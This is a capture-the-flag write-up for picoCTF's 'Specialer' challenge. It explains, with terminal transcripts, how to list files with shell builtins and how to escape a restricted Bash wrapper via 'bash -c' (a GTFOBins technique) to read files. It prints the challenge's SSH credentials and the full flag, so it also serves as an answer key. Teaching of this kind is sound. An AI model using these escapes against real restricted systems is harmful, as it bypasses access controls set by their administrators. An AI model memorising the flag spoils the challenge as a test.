# Specialer — picoCTF Writeup

**Challenge:** Specialer  
**Category:** General Skills  
**Difficulty:** Medium  
**Points:** 400  
**Flag:** `picoCTF{y0u_d0n7_4ppr3c1473_wh47_w3r3_d01ng_h3r3_d5ef8b71}`  
**Platform:** picoCTF 2023  
**Writeup by:** zham  

---

## Description

> Reception of Special has been cool to say the least. That's why we made an exclusive version of Special, called Secure Comprehensive Interface for Affecting Linux Empirically Rad, or just 'Specialer'. With Specialer, we really tried to remove the distractions from using a shell. Yes, we took out spell checker because of everybody's complaining. But we think you will be excited about our new, reduced feature set for keeping you focused on what needs it the most. Please start an instance to test your very own copy of Specialer.
> `ssh -p 63339 ctf-player@saturn.picoctf.net`. The password is `483e80d4`

**Hint 1:** `What programs do you have access to?`

---

## Background Knowledge (Read This First!)

### What is a restricted shell?

A normal Bash session lets you run any program found in your `$PATH` — `ls`, `cat`, `whoami`, anything. A **restricted shell** (often built as `rbash`, or in this case a custom wrapper) strips that down to a tiny whitelist of Bash **builtins and keywords** — commands that live inside Bash itself rather than as separate files on disk. If a command isn't on that whitelist, the shell refuses it with `command not found`, even if the binary technically exists on the box.

### Why `whoami` and `cat` fail but `pwd` works

`pwd`, `echo`, and friends are Bash builtins — they run inside the shell process itself, so the restriction never gets a chance to block them. `whoami` and `cat`, on the other hand, are separate executables the shell has to go find and launch — and that launch step is exactly what's being blocked.

### Listing files without `ls`

`echo` is allowed, and `echo *` doesn't actually need `ls` at all — `*` is expanded by Bash itself before `echo` ever runs, so it just prints whatever filenames are sitting in the current directory. Same trick works one level deeper: `echo abra/*` lists everything inside `abra/`.

### Finding the escape hatch

Pressing `Tab` twice on an empty prompt asks Bash to list every command it would consider running — which, in a restricted shell, means it lists exactly what's on the whitelist. Scanning that list for anything that isn't a plain builtin is the move: in Specialer's case, `bash` itself shows up. That's the giveaway.

### Why `bash` being whitelisted is a big deal

This is a documented technique on **GTFOBins** (https://gtfobins.github.io/gtfobins/bash/#file-read) — if a restricted environment lets you run `bash` at all, you've already escaped, because:
- `bash -c '<command>'` spawns a brand-new, fully unrestricted Bash process and runs `<command>` inside it
- `$(<file)` is Bash's built-in way to read a file into a command substitution — no `cat` required, so it works fine inside that fresh process

---

## Solution — Step by Step

### Step 1 — Connect via SSH

```
┌──(zham㉿kali)-[~]
└─$ ssh -p 63339 ctf-player@saturn.picoctf.net
The authenticity of host '[saturn.picoctf.net]:63339 ([13.59.203.175]:63339)' can't be established.
ED25519 key fingerprint is: SHA256:lMXKIC17ONzyUJx7ZYBY5VSwoxCz20uq5/Nm+IhXKew
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[saturn.picoctf.net]:63339' (ED25519) to the list of known hosts.
ctf-player@saturn.picoctf.net's password: 483e80d4
Specialer$
```

### Step 2 — Confirm we're in a restricted shell

```
Specialer$ whoami
-bash: whoami: command not found
Specialer$ pwd
/home/ctf-player
```

`whoami` is rejected outright. `pwd` works fine — it's a builtin, not an external program.

### Step 3 — List directories using `echo`, not `ls`

```
Specialer$ echo *
abra ala sim
```

Three directories: `abra`, `ala`, `sim`.

### Step 4 — Drill into each directory the same way

```
Specialer$ echo abra/*
abra/cadabra.txt abra/cadaniel.txt
Specialer$ echo ala/*
ala/kazam.txt ala/mode.txt
Specialer$ echo sim/*
sim/city.txt sim/salabim.txt
```

Six files total, two per folder.

### Step 5 — Reveal the command whitelist

Pressing `Tab` twice at an empty `Specialer$` prompt dumps the full list of allowed commands — almost entirely Bash builtins and keywords (`echo`, `pwd`, `read`, `if`, `for`, `case`, etc.), with one notable outlier sitting in the list: `bash`.

### Step 6 — Read every file using the `bash -c` escape

`cat` is blocked, but `bash -c` plus `$(<file)` reads file contents using nothing but Bash's own machinery:

```
Specialer$ bash -c 'echo "$(<abra/cadabra.txt)"'
Nothing up my sleeve!
Specialer$ bash -c 'echo "$(<abra/cadaniel.txt)"'
Yes, I did it! I really did it! I'm a true wizard!
Specialer$ bash -c 'echo "$(<ala/kazam.txt)"'
return 0 picoCTF{y0u_d0n7_4ppr3c1473_wh47_w3r3_d01ng_h3r3_d5ef8b71}
Specialer$ bash -c 'echo "$(<ala/mode.txt)"'
Yummy! Ice cream!
Specialer$ bash -c 'echo "$(<sim/city.txt)"'
05ed181c-4aa0-4d4a-8505-2fe6ca9097d3
Specialer$ bash -c 'echo "$(<sim/salabim.txt)"'
#He was so kind, such a gentleman tied to the oceanside#
```

The flag was sitting in `ala/kazam.txt` — fitting, since "Ala kazam!" is the classic magician's catchphrase, and `abra/` held the "Abra cadabra" half of the joke. The other four files are just red herrings to make you read all six.

---

## Alternative Method — Skip `bash -c` and escape entirely

Instead of wrapping every command in `bash -c '...'`, you can spawn a fully unrestricted shell once and just work normally inside it:

```
Specialer$ bash
ctf-player@challenge:~$ ls
abra  ala  sim
ctf-player@challenge:~$ cat ala/kazam.txt
return 0 picoCTF{y0u_d0n7_4ppr3c1473_wh47_w3r3_d01ng_h3r3_d5ef8b71}
```

Same root cause — `bash` being on the whitelist is the entire vulnerability — but this way you get a normal, unrestricted prompt instead of repeating `bash -c` for every command.

---

## What Happened Internally

```
Timeline:
1. SSH connects — dropped into "Specialer$", a custom restricted Bash wrapper
2. whoami fails — confirms external binaries outside the whitelist are blocked
3. echo * — Bash glob expansion lists directories without needing ls
4. echo <dir>/* — same trick, one level deeper, reveals all 6 filenames
5. Tab Tab — restricted shell discloses its own whitelist, "bash" stands out
6. bash -c 'echo "$(<file)"' — spawns unrestricted Bash, reads file via redirection
7. ala/kazam.txt — contains the flag
```

---

## Tools Used

| Tool | Purpose | Level |
|---|---|---|
| `ssh` | Connect to the challenge server | Easy |
| `echo *` | List files/directories without `ls` | Easy |
| `Tab` `Tab` | Reveal the restricted shell's full command whitelist | Easy |
| `bash -c` | GTFOBins escape — run any command via a fresh, unrestricted Bash process | Medium |
| `$(<file)` | Bash's built-in file-read substitution, used in place of `cat` | Medium |

---

## Key Takeaways

- **Restricted shells whitelist by command name, not by capability** — if `bash` itself (or any other full interpreter: `python`, `perl`, `awk`, `vim`) is on the list, the restriction is broken by design, since that program can spawn an unrestricted child process
- **`Tab` `Tab` on an empty prompt is the fastest recon move** in any unfamiliar restricted shell — it tells you exactly what you're allowed to abuse
- **Bash builtins survive almost any restriction** — `echo`, `pwd`, and redirection like `$(<file)` run inside the shell process itself, so they're rarely blocked even when every external binary is
- **GTFOBins (https://gtfobins.github.io)** is the reference to check the moment you see a familiar binary name in a command whitelist — most common Linux tools have a documented shell-escape technique listed there
- The flag `y0u_d0n7_4ppr3c1473_wh47_w3r3_d01ng_h3r3` decodes to "you don't appreciate what we're doing here" — the devs' tongue-in-cheek jab back at users who complained about "Special" losing its spell-checker, hidden inside the "Ala kazam!" file as the punchline to the abra-cadabra / ala-kazam magic-word joke running through the challenge
